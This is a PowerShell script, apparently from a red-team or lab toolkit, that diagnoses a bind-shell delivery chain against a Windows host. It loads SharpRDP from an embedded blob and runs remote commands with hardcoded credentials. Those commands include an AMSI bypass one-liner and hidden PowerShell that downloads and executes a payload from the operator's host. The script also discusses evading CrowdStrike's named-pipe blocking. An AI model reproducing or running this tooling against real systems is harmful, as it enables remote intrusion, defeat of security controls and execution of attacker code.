# DiagnoseExecChain.ps1
# Systematic diagnostic: find exactly where the pipe delivery chain breaks.
# Uses HTTP callbacks for all verification -- no UNC paths needed (works with
# non-admin hodor). Uses exec=cmd mode (same as the actual bind shell delivery).
#
# Run each test in order. Stop when one fails -- that's the layer to fix.
#
# Test 1: AMSI bypass + HTTP beacon (confirms PS runs, AMSI bypass works, network OK)
#   Pass => PS executes, bypass is not killed, target reaches operator:8080
#   Fail => PS killed, AMSI bypass flagged, or firewall blocking 8080
#
# Test 2: AMSI bypass + download + HTTP beacon (confirms serve URL works)
#   Pass => target downloads pipe_*.ps1 from serve; serve is running
#   Fail => serve not running, wrong URL, or file not present
#
# Test 3: AMSI bypass + inline pipe server (confirms pipe creation works)
#   Uses inline pipe server embedded in the command -- no download needed.
#   Pass => pipe appears; PS + AMSI bypass + pipe creation all work
#   Fail => CrowdStrike blocks named pipe creation, or smb auth failure

param(
    [string]$Target      = "10.3.10.22",
    [string]$Username    = "NORTH\hodor",
    [string]$Password    = "hodor",
    [string]$OperatorIP  = "10.3.10.157",
    [int]   $CbPort      = 9797,
    [int]   $WaitSecs    = 25,
    [int]   $ConnTimeout = 5000
)

$root = Split-Path -Parent $PSScriptRoot
$domain = $Username.Split('\')[0]
$user   = $Username.Split('\')[-1]

# ---------------------------------------------------------------------------
# Load SharpRDP from gzip blob in Invoke-SharpRDP.ps1
# ---------------------------------------------------------------------------
function Load-SharpRDP {
    $existing = [System.AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GetName().Name -eq 'SharpRDP' }
    if ($existing) { return $existing }
    $invokePath = Join-Path $root 'Tools\Invoke-SharpRDP.ps1'
    if (-not (Test-Path $invokePath)) {
        Write-Host "[-] Not found: $invokePath" -ForegroundColor Red; return $null
    }
    $src = [System.IO.File]::ReadAllText($invokePath)
    $m   = [regex]::Match($src, '"(H4sI[A-Za-z0-9+/=]{100,})"')
    if (-not $m.Success) {
        Write-Host '[-] Cannot find gzip blob in Invoke-SharpRDP.ps1' -ForegroundColor Red; return $null
    }
    $ms1 = New-Object IO.MemoryStream(,[Convert]::FromBase64String($m.Groups[1].Value))
    $gz  = New-Object IO.Compression.GzipStream($ms1,[IO.Compression.CompressionMode]::Decompress)
    $ms2 = New-Object IO.MemoryStream; $gz.CopyTo($ms2); $gz.Close(); $ms1.Close()
    $asm = [System.Reflection.Assembly]::Load($ms2.ToArray())
    Write-Host ('[+] SharpRDP loaded: ' + $asm.GetName().Name) -ForegroundColor Green
    return $asm
}

function Invoke-SRDP {
    param([string]$Label, [string]$Command, $Assembly)
    Write-Host ''
    Write-Host ('[*] ' + $Label) -ForegroundColor Cyan
    Write-Host ('    cmd (' + $Command.Length + ' chars): ' + $Command) -ForegroundColor DarkGray
    & net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1 | Out-Null
    $Assembly.EntryPoint.Invoke($null, @(,[string[]]@(
        "computername=$Target",
        "username=$Username",
        "password=$Password",
        "command=$Command",
        "exec=cmd"
    )))
    & net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
}

# ---------------------------------------------------------------------------
# HTTP callback listener (runs in background job, like SweepSharpRDP)
# ---------------------------------------------------------------------------
function Start-CbListener {
    param([int]$Port, [int]$TimeoutSecs = 60)
    netsh advfirewall firewall add rule name="DiagCb$Port" dir=in action=allow protocol=tcp localport=$Port 2>&1 | Out-Null
    $job = Start-Job -ScriptBlock {
        param($port, $tout)
        $l = [Net.HttpListener]::new()
        $l.Prefixes.Add("http://+:$port/")
        try { $l.Start() } catch { Write-Output "[-] Listen fail: $_"; return }
        Write-Output "[+] CB listening on $port"
        $dl = (Get-Date).AddSeconds($tout)
        $hits = @()
        while ((Get-Date) -lt $dl) {
            try {
                $t = $l.BeginGetContext($null,$null)
                if ($t.AsyncWaitHandle.WaitOne(500)) {
                    $ctx = $l.EndGetContext($t)
                    $path = $ctx.Request.Url.LocalPath
                    $from = $ctx.Request.RemoteEndPoint.Address
                    Write-Output "[+] HIT: $path from $from"
                    $hits += "$path from $from"
                    $ctx.Response.StatusCode = 200
                    $ctx.Response.OutputStream.Close()
                }
            } catch { break }
        }
        try { $l.Stop() } catch {}
        Write-Output "HITS:$($hits.Count)"
    } -ArgumentList $Port,$TimeoutSecs
    Start-Sleep 2
    Receive-Job $job | ForEach-Object { Write-Host $_ -ForegroundColor Green }
    return $job
}

function Wait-ForCallback {
    param($Job, [string]$Token, [int]$WaitSecs)
    Write-Host "    [*] Waiting ${WaitSecs}s for callback /$Token ..." -ForegroundColor Yellow
    $dl = (Get-Date).AddSeconds($WaitSecs)
    while ((Get-Date) -lt $dl) {
        $out = Receive-Job $job 2>$null
        if ($out) { Write-Host $out -ForegroundColor Green }
        if ($out -match [regex]::Escape($Token)) { return $true }
        Start-Sleep 1
    }
    return $false
}

function Stop-CbListener {
    param($Job, [int]$Port)
    Stop-Job $Job -ErrorAction SilentlyContinue
    Remove-Job $Job -ErrorAction SilentlyContinue
    netsh advfirewall firewall delete rule name="DiagCb$Port" 2>&1 | Out-Null
}

$asm = Load-SharpRDP
if (-not $asm) { return }

$amsiBypass = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"

Write-Host ''
Write-Host '=== DiagnoseExecChain ===' -ForegroundColor White
Write-Host "    Target:   $Target" -ForegroundColor Gray
Write-Host "    Operator: $OperatorIP`:$CbPort" -ForegroundColor Gray
Write-Host "    Mode:     exec=cmd (same as actual bind shell delivery)" -ForegroundColor Gray

# ===========================================================================
# TEST 1: AMSI bypass + HTTP beacon
# Confirms: PS executes, AMSI bypass not killed, outbound HTTP works
# ===========================================================================
$tok1 = 'diag1_' + (-join ((65..90) | Get-Random -Count 6 | % { [char]$_ }))
$cb1  = "(new-object net.webclient).downloadstring('http://${OperatorIP}:${CbPort}/$tok1') | out-null"
$cmd1 = "powershell -nop -ep bypass -w hidden -c `"$amsiBypass;$cb1`""

$cbJob = Start-CbListener -Port $CbPort -TimeoutSecs 90
Invoke-SRDP -Assembly $asm -Label 'TEST 1: AMSI bypass + HTTP beacon' -Command $cmd1
$pass1 = Wait-ForCallback -Job $cbJob -Token $tok1 -WaitSecs $WaitSecs

if ($pass1) {
    Write-Host '    [+] PASS: PS executes on target; AMSI bypass not blocked; outbound HTTP works' -ForegroundColor Green
} else {
    Write-Host '    [-] FAIL: No callback received' -ForegroundColor Red
    Write-Host '        Causes: PS process killed on spawn, AMSI bypass blocked, or port 8080 not accessible from target' -ForegroundColor DarkYellow
    Write-Host '        Confirm: exec=cmd requires an UNLOCKED active session on target as hodor' -ForegroundColor DarkYellow
    Stop-CbListener -Job $cbJob -Port $CbPort
    Write-Host ''; Write-Host '[!] TEST 1 FAILED. Fix before continuing.' -ForegroundColor Red; return
}

# ===========================================================================
# TEST 2: AMSI bypass + download from serve + HTTP beacon
# Confirms: serve is running, URL is reachable, file is served correctly
# Run AFTER starting serve in Amnesiac ("serve" command)
# ===========================================================================
$tok2 = 'diag2_' + (-join ((65..90) | Get-Random -Count 6 | % { [char]$_ }))
$cb2  = "(new-object net.webclient).downloadstring('http://${OperatorIP}:${CbPort}/$tok2') | out-null"

# Check if a pipe payload file exists to download
$pipeFiles = Get-ChildItem -Path $root -Filter "pipe_*.ps1" -ErrorAction SilentlyContinue
if ($pipeFiles) {
    $serveFile = $pipeFiles[0].Name
    Write-Host "    [*] Found pipe payload: $serveFile" -ForegroundColor Cyan
    $dl2  = "iex(new-object net.webclient).downloadstring('http://${OperatorIP}:8080/$serveFile')"
    $cmd2 = "powershell -nop -ep bypass -w hidden -c `"$amsiBypass;$dl2;$cb2`""
} else {
    Write-Host '    [!] No pipe_*.ps1 found -- generating a dummy serve test file' -ForegroundColor Yellow
    $serveFile = "diagtest_$tok2.txt"
    Set-Content -Path (Join-Path $root $serveFile) -Value "ok"
    $dl2  = "(new-object net.webclient).downloadstring('http://${OperatorIP}:8080/$serveFile')"
    $cmd2 = "powershell -nop -ep bypass -w hidden -c `"$amsiBypass;`$r=$dl2;if(`$r-eq'ok'){$cb2}`""
}

Invoke-SRDP -Assembly $asm -Label 'TEST 2: AMSI bypass + download from serve + HTTP beacon (requires "serve" running)' -Command $cmd2
$pass2 = Wait-ForCallback -Job $cbJob -Token $tok2 -WaitSecs $WaitSecs

if ($pass2) {
    Write-Host "    [+] PASS: serve is accessible from target; file '$serveFile' downloaded" -ForegroundColor Green
} else {
    Write-Host "    [-] FAIL: target did not reach serve at http://${OperatorIP}:8080/$serveFile" -ForegroundColor Red
    Write-Host '        Causes: serve not running (run "serve" in Amnesiac local shell first),' -ForegroundColor DarkYellow
    Write-Host '        firewall blocking port 8080, or wrong OperatorIP' -ForegroundColor DarkYellow
    Stop-CbListener -Job $cbJob -Port $CbPort
    Write-Host ''; Write-Host '[!] TEST 2 FAILED. Start serve then re-run.' -ForegroundColor Red; return
}

Stop-CbListener -Job $cbJob -Port $CbPort

# ===========================================================================
# TEST 3: AMSI bypass + inline pipe server
# No download. Pipe server embedded directly in command.
# If this pipe connects, PS + AMSI bypass + pipe creation all work.
# Root cause of no_pipe would then be in the downloaded pipe_*.ps1 script.
# ===========================================================================
$pipeName = 'dg' + (-join ((97..122) | Get-Random -Count 6 | % { [char]$_ }))
$pipeCmd  = "`$p=new-object system.io.pipes.namedpipeserverstream('$pipeName','inout',1,'byte','none');`$p.waitforconnection();`$p.dispose()"
$cmd3     = "powershell -nop -ep bypass -w hidden -c `"$amsiBypass;$pipeCmd`""

Invoke-SRDP -Assembly $asm -Label ("TEST 3: AMSI bypass + inline pipe server (pipe=$pipeName)") -Command $cmd3

Write-Host ('    [*] Waiting ${WaitSecs}s for pipe \\' + $Target + '\pipe\' + $pipeName + '...') -ForegroundColor Yellow
Start-Sleep ($WaitSecs - 5)

$pass3 = $false
try {
    & net use "\\$Target\IPC`$" "/user:$domain\$user" $Password 2>&1 | Out-Null
    $client = New-Object System.IO.Pipes.NamedPipeClientStream($Target, $pipeName, 'InOut')
    $client.Connect($ConnTimeout)
    $pass3 = $true
    Write-Host '    [+] PASS: pipe connected! AMSI bypass + pipe creation work end-to-end.' -ForegroundColor Green
    Write-Host "        If the actual bind shell still shows no_pipe, the problem is in pipe_*.ps1" -ForegroundColor Cyan
    Write-Host "        itself (AMSI blocked the downloaded script, or serve served wrong content)." -ForegroundColor Cyan
    $client.Dispose()
    & net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
} catch {
    Write-Host ('    [-] FAIL: ' + $_.Exception.Message) -ForegroundColor Red
    Write-Host '        Tests 1 and 2 passed (AMSI bypass + download work) but inline pipe failed.' -ForegroundColor DarkYellow
    Write-Host '        Possible: CrowdStrike blocks named pipe creation specifically,' -ForegroundColor DarkYellow
    Write-Host '        or SMB auth failure from operator (check runas /netonly session).' -ForegroundColor DarkYellow
    & net use "\\$Target\IPC`$" /delete 2>&1 | Out-Null
}

Write-Host ''
Write-Host '[*] Diagnostic complete.' -ForegroundColor Cyan
if ($pass1 -and $pass2 -and $pass3) {
    Write-Host '[+] ALL TESTS PASSED -- bind shell delivery chain is fully working.' -ForegroundColor Green
    Write-Host '    If you still see no_pipe in Amnesiac: confirm "serve" is running and' -ForegroundColor Green
    Write-Host '    the pipe_*.ps1 file is there when you start the listener.' -ForegroundColor Green
} elseif ($pass1 -and $pass2 -and -not $pass3) {
    Write-Host '[~] Tests 1-2 pass but pipe fails -- pipe creation or SMB auth issue.' -ForegroundColor Yellow
} elseif ($pass1 -and -not $pass2) {
    Write-Host '[~] Test 1 passes but download fails -- serve is the bottleneck.' -ForegroundColor Yellow
}
